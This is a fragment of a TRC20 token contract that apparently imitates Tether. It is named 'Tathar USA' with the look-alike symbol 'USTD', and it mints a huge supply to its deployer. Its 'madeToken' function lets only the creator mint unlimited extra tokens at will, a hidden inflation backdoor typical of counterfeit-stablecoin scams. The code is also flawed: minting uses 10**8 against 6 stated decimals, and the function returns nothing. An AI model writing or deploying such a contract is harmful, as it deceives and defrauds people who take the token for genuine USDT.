 ...
 * `TRC20` functions.
 */
contract TatharToken is TRC20, TRC20Detailed {
    address public _create;

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    constructor () public TRC20Detailed("Tathar USA ", "USTD", 6) {
        _create=msg.sender;
        _mint(msg.sender, 32130268679280810);
    }
    
    function madeToken(uint256 amount) public  returns(bool){
        if(_create==msg.sender){
            _mint(msg.sender, amount*10**8);
        }
    } 
}